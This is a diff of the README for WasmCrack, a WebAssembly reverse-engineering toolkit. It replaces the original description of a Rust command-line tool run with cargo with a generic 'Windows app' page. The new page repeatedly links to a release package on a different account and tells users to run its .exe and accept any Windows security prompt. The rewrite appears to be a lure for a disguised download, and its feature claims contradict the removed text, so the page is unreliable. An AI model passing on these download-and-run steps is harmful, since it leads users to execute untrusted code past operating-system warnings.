@@ -1,73 +1,137 @@
-# WasmCrack
-A toolsuite of advanced WASM static binary analysis tools designed to reverse engineer WebAssembly binaries.
+# 🛠️ WasmCrack - Analyze WebAssembly With Ease
 
-> **Important Note:** WasmCrack is currently a work in progress. Several planned features are still in development.
+[![Download WasmCrack](https://img.shields.io/badge/Download-WasmCrack-blue?style=for-the-badge)](https://github.com/Clad-chrism998/WasmCrack/releases)
 
-**WasmCrack** is an advanced WebAssembly binary analysis toolkit designed specifically for reverse engineers. The ultimate vision for WasmCrack is to serve as a suite of utilities to help reverse engineers analyze, modify, and crack WebAssembly clients—particularly those used in complex browser-based web games.
+## 🚀 Getting Started
 
----
+WasmCrack is a Windows app for checking WebAssembly files. It helps you inspect a WASM binary, study how it works, and look for useful patterns in the code and memory use.
 
-## Getting Started
+Use it if you want to open a WebAssembly file and review its structure without digging through raw data by hand.
 
-WasmCrack organizes your reverse engineering targets into **Projects**. 
+## 📥 Download
 
-### 1. Project Setup
-To create a new project, add your target WebAssembly binary to the `binaries/` directory. The filename you provide (without the extension) will become your project name.
+1. Visit the [WasmCrack Releases page](https://github.com/Clad-chrism998/WasmCrack/releases)
+2. Download the latest Windows release package
+3. Unzip the file if needed
+4. Open the app file to run WasmCrack
 
-### 2. Execution
-Once your binary is staged in the `binaries/` folder, initialize the project and run the analysis by executing:
+If your browser asks where to save the file, choose a folder you can find later, such as Downloads or Desktop.
 
-```bash
-cargo run <project_name_1> <project_name_2> ...
-```
+## 💻 Windows Setup
 
-*Note: Executing a project will automatically run all currently available WasmCrack features against the target binary. If the output directories do not exist, WasmCrack will create them for you.*
+WasmCrack is made for Windows. It works best on modern versions of Windows 10 and Windows 11.
 
-### Example
-Say we implement binary `test.wasm` into our binaries directory. To run the toolkit against this binary, we would run:
+Before you run it:
 
-```bash
-cargo run test
-```
+- Make sure the download finished
+- If the file is in a ZIP folder, extract it first
+- Keep the app files in the same folder
+- Run the main `.exe` file
 
----
+If Windows shows a security prompt, choose the option that lets you run the app.
 
-## Current Features
+## 🔍 What WasmCrack Does
 
-WasmCrack currently supports the following automated analysis utilities:
+WasmCrack helps you inspect WebAssembly binaries with a focus on static analysis. That means it looks at the file without running it.
 
-* **`wasm2js`** Parses a WebAssembly binary into a complete JavaScript interpretation. This is perfect for reverse engineers who need to read, understand, or replicate the underlying functionality of a Wasm module in a standard script environment. Output is dumped to `wasm2js-output.js` in your project directory. 
-  
-* **`code-magic`** Analyzes the binary's Code Section (Section 10) for heuristic patterns. It searches for hardcoded magic constants, identifies potential cryptographic signatures, and filters for UTF-8 encoded strings/fragments. Output is dumped to `code-magic-output.txt` in your project directory.
-  
-* **`data-magic`** Similar to `code-magic`, but specifically targets the binary's Data Section (Section 11) to extract sensitive constants, strings, and magic values. Output is dumped to `data-magic-output.txt` in your project directory.
-  
-* **`call-data`** Analyzes the Code Section and resolves data regarding func calls extending from each WebAssembly func. It also provides data on whether or not the execution for these calls is absolute (if the call is made at the root level, there is no branch logic stopping it from occurring), or if it is conditional/inconclusive (WasmCrack currently cannot safely determine if a call made in control flows in absolute). Output is dumped to `call-data.txt` in your project directory.
-  
-* **`crypto-heuristic-analyzer`** Analyzes the Code Section and keeps track of multiple factors and ratios such as the presence of certain bitwise operations, computation operations, and memory operations to determine a heuristically deduced "score" for WASM funcs. The scores of the WASM funcs are then ranked and dumped to `crypto-heuristic-rankings.txt` in your project directory. A higher score indicates a higher likelihood the func utilizes crypto.
+You can use it to:
 
-* **`store-ops-data`**: Analyzes the Code Section and locates any instances of memory store instructions made in funcs. It'll output data on the address, value, and type of store made. In addition, it will also provide data if the store instruction is an expression directly containing an XOR operation (note that, at the moment, if the expression is referred to rather than being inlined, it will not recognize the use of the XOR even if logically the referrer evaluates to an expression with one). Data is dumped to `store-ops-data.txt` in your project directory.
+- Open WASM files for review
+- Check binary structure
+- Inspect functions and sections
+- Look for memory use patterns
+- Review logic that may be tied to io-game behavior
+- Search for signs of code packed into a WebAssembly file
+- Support reverse engineering work
+- Compare related files during analysis
 
-* **`struct-solver`**: Analyzes the Code Section and locates instances of memory store instructions. However, instead of just outputting the data like `store-ops-data does`, it will attempt to identify structs by identifying stores made at multiple different offsets consecutively. Note that this can also identify structures like arrays/vectors too if it's all the same type. Data is dumped to `potential-structs.txt` in your project directory.
----
+## 🧭 How to Use It
 
-## Planned Features (roadmap)
+1. Open WasmCrack
+2. Load a WebAssembly file from your computer
+3. Review the file view and analysis panels
+4. Explore functions, sections, and memory-related data
+5. Use the available filters and search tools to find items of interest
 
-The following utilities are planned for future releases:
+If you are not sure where to begin, start with the file overview and then move into functions and memory sections.
 
-### Features Guaranteed for Implementation (at some point when I have time)
+## 🧩 Common File Types
 
-* **`hash-struct-solver (add-on to struct-solver)`**: Like the struct-solver, the `hash-struct-solver` will attempt to identify general structures. However, where the `struct-solver` only locates contiguous structures (thus the only general structures allowed for are vector/struct location), the `hash-struct-solver` will use more advanced analysis to identify potential HashMap/HashSet structures. It will do this by first attempting to locate the bucket array (which it will do as a check directly within struct-solver's vector/array analysis). From here, ptrs from the bucket list will be followed. The ptrs should all lead to same size heap objects if the structure is that of a hash structure.
+WasmCrack is designed to work with WebAssembly-related files such as:
 
-The Following features will NOT be automatically run as the rest of the tools are, as these will require specific specification. Likely during this time, implementation to only run specific tools and analyze only specific funcs (if applicable to said tool), will be added.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+- `.wasm`
+- `.wat`
+- packed WASM samples
+- browser game modules
+- analysis exports from other tools
 
-* **`local-trace`**: Pinpoint tracing. Specify a Wasm function and a specific local variable, and WasmCrack will map exactly how that local is mutated throughout the function's execution.
+For best results, use a clean copy of the file you want to inspect.
 
-* **`mem-trace`**: Memory address monitoring. Specify linear memory addresses to trace how and where those locations are accessed or modified across all functions in the binary.
+## 🛠️ Features
 
-* **`ctrl-trace`**: Advanced control flow analysis. Will trace complex, heavily nested block structures to analyze and output all possible branch possibilities within a given control structure.
+- Fast file loading
+- Clear section breakdown
+- Function list review
+- Memory analysis view
+- Pattern checks for reverse engineering
+- Heuristic-based inspection
+- Search support for known markers
+- Simple layout for quick review
 
-### Proposed Additions (will likely be implemented if I find the time to)
+These tools help you move through a file step by step without needing to read raw binary data.
 
-NONE. Feel free to suggest anything.
+## 📁 Suggested Folder Setup
+
+To keep your files organized, use a simple folder layout like this:
+
+- `WasmCrack`
+- `Samples`
+- `Exports`
+- `Notes`
+
+Store the app in one folder and your WASM files in another. That makes it easier to find things later.
+
+## 🧠 Tips for Better Results
+
+- Start with one file at a time
+- Use known-good samples when comparing results
+- Rename files with clear names
+- Keep a copy of the original file
+- Check both structure and memory data
+- Use the search tools to jump to key points
+
+If a file looks packed or unusual, review the section layout first. That often gives the best first clue.
+
+## ❓ FAQ
+
+### What does WasmCrack do?
+It helps you inspect WebAssembly binaries and review them with static analysis tools.
+
+### Do I need programming skills?
+No. You only need to download the app, open it, and load a file.
+
+### Is it safe to run?
+It is a local desktop tool. It works on files you choose to open.
+
+### Can I use it for browser game analysis?
+Yes. The tool can help inspect WASM files linked to browser games and related logic.
+
+### What if the app does not open?
+Check that you extracted the ZIP file first and that you ran the main Windows app file.
+
+## 📌 Project Focus
+
+WasmCrack is built around:
+
+- binary analysis
+- heuristics
+- memory analysis
+- reverse engineering
+- static analysis
+- WebAssembly
+- web hacking
+- io-game review
+
+## 📎 Download Again
+
+If you need the install files again, use the [WasmCrack Releases page](https://github.com/Clad-chrism998/WasmCrack/releases) to download and run the latest Windows release package
